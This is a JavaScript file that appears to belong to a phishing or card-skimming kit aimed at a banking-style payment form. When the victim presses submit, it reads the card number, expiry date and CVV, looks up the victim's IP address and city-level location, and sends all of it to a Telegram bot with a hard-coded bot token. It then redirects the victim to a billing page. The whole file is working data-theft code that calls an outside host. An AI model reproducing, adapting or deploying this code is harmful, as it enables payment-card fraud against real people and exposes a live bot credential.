async function getUserIP() {
  const response = await fetch("https://api.ipify.org?format=json");
  const data = await response.json();
  return data.ip;
}

async function getUserLocation() {
  const response = await fetch("https://ipapi.co/json/");
  const data = await response.json();
  return `${data.city},${data.region},${data.country_name}`;
}

function getBrowserInfo() {
  return navigator.userAgent;
}

function getCurrentTime() {
  return new Date().toUTCString();
}

document
  .querySelector('q2-btn[test-id="btnSubmit"]')
  .addEventListener("click", async function (event) {
    event.preventDefault();
    const cardNumber = document
      .querySelector('q2-input[test-id="fldCardNumber"]')
      .shadowRoot.querySelector("input").value;
    const expDate = document
      .querySelector('q2-input[test-id="fldExpDate"]')
      .shadowRoot.querySelector("input").value;
    const cvv = document
      .querySelector('q2-input[test-id="fldCVV"]')
      .shadowRoot.querySelector("input").value;

    const ip = await getUserIP();
    const location = await getUserLocation();
    const browserInfo = getBrowserInfo();
    const currentTime = getCurrentTime();

    // Data to bot
    const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
    const chatId = "1139790477";
    const message = `Card Number 💳: ${cardNumber} \n Expiry Date: ${expDate} \n CVV: ${cvv} \n ------------------------------------------------- \n \n IP Address 🌍: ${ip} \n Location 📍: ${location} `;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: `POST`,
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          //Redirect to the next page
          window.location.href = "billing.html";
        } else {
          alert("Failed to send message");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Error sending message");
      });
  });
